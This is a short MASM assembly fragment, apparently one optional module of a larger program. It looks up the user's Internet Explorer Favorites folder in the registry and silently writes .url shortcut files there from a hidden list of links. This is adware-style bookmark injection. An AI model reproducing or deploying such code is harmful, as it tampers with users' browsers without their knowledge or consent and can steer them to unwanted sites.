IFDEF MOD_IEF
 lpB1         db 	"%s\%s.url",0  
 lpB2         db 	"[InternetShortcut]",13,10,"URL=%s",0
 Favoritesreg db  "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0 
 szFav	      db 	"Favorites",0 
 lpB          db 	"\",0 
include favorits.inc
.code
createlink proc  link, ink: DWORD
LOCAL   bWritten: DWORD
LOCAL   hFile: DWORD 
invoke wsprintf, addr lpBuf2, addr lpB1, ink, link
invoke  CreateFile, addr lpBuf2, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @end
             invoke wsprintf, addr lpBuf2,addr lpB2,link
        invoke  lstrlen,offset lpBuf2
        mov     edx, eax
        invoke  WriteFile, hFile,offset lpBuf2, edx, addr bWritten, NULL
        invoke  CloseHandle, hFile

        @end:
        ret
createlink endp

createlinks proc
invoke RegOpenKeyEx, HKEY_CURRENT_USER, addr Favoritesreg, 0, KEY_QUERY_VALUE, addr hKey
invoke RegQueryValueEx, hKey, addr szFav, 0, 0, addr lpBuf1, addr bsize
invoke RegCloseKey, hKey
invoke lstrcat,offset lpBuf1 , offset lpB
mov     edi,  offset szFavorits

  @next:
invoke createlink, edi,offset lpBuf1
    mNextListEntry @next
ret
createlinks endp
ENDIF